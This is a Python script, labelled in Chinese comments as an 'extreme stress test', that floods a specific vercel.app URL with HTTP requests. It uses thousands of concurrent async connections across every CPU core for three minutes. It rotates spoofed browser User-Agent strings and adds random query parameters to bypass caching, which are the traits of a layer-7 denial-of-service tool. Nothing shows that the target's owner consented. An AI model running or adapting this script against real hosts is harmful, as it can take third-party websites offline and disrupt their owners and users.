import asyncio
import aiohttp
import multiprocessing
import time
import random
import string
import sys

# --- 極限測試設定 ---
TARGET_URL = "https://cg-coral-five.vercel.app/"
CONCURRENT_PER_PROCESS = 1000  # 增加併發數
TOTAL_SECONDS = 180
# --------------------

def get_random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

async def stress_test(session, end_time, s_count, f_count):
    # 預先定義常用的 User-Agent 模擬真實流量
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    ]

    while time.time() < end_time:
        # 【關鍵】Cache-Busting: 在網址後加上隨機參數，強制伺服器處理請求而不使用快取
        url = f"{TARGET_URL}?v={get_random_string(8)}&search={get_random_string(5)}"
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
        }

        try:
            # 測試伺服器對大數據處理的能力，改用 POST 測試（如果該頁面接受）
            # 或者維持 GET 但頻率拉高
            async with session.get(url, timeout=5, ssl=False, headers=headers) as response:
                await response.read()
                with s_count.get_lock(): s_count.value += 1
        except:
            with f_count.get_lock(): f_count.value += 1

def start_process_loop(end_time, s_count, f_count):
    async def run():
        # 設定較大的連線池上限，並縮短連線回收時間
        connector = aiohttp.TCPConnector(
            limit=CONCURRENT_PER_PROCESS,
            force_close=False, 
            ttl_dns_cache=600
        )
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [stress_test(session, end_time, s_count, f_count) for _ in range(CONCURRENT_PER_PROCESS)]
            await asyncio.gather(*tasks)

    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    asyncio.run(run())

if __name__ == "__main__":
    multiprocessing.set_start_method('spawn', force=True)
    cpu_count = multiprocessing.cpu_count()
    print(f"🔥 強力模式啟動 - 使用 {cpu_count} 核心")
    
    end_ts = time.time() + TOTAL_SECONDS
    s_cnt = multiprocessing.Value('i', 0)
    f_cnt = multiprocessing.Value('i', 0)
    
    processes = []
    for _ in range(cpu_count):
        p = multiprocessing.Process(target=start_process_loop, args=(end_ts, s_cnt, f_cnt))
        p.start()
        processes.append(p)

    # 監控畫面
    start_time = time.time()
    try:
        while time.time() < end_ts:
            time.sleep(1)
            elapsed = time.time() - start_time
            rps = int(s_cnt.value / elapsed) if elapsed > 0 else 0
            print(f"\r[壓力測試] 已運行: {int(elapsed)}s | 成功請求: {s_cnt.value} | 失敗: {f_cnt.value} | RPS: {rps}", end="")
    except KeyboardInterrupt:
        pass
    
    for p in processes: p.terminate()
    print("\n✅ 測試停止。")